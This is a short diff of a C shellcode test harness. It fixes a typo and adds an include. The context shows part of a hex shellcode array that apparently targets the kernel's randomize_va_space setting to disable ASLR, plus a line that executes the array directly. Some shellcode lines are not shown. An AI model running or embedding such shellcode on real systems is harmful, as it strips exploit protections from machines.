@@ -42,6 +42,7 @@ Disassembly of section .text:
 */
 
 #include <stdio.h>
+#include <string.h>
 
 char shellcode[] = "\x31\xc0\x50\x68\x70\x61\x63\x65\x68\x76\x61\x5f\x73\x68"
                    "\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61"
@@ -53,6 +54,6 @@ char shellcode[] = "\x31\xc0\x50\x68\x70\x61\x63\x65\x68\x76\x61\x5f\x73\x68"
 
 int main()
 {
-  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
+  fprintf(stdout,"Length: %d\n",strlen(shellcode));
   (*(void  (*)()) shellcode)();
 }
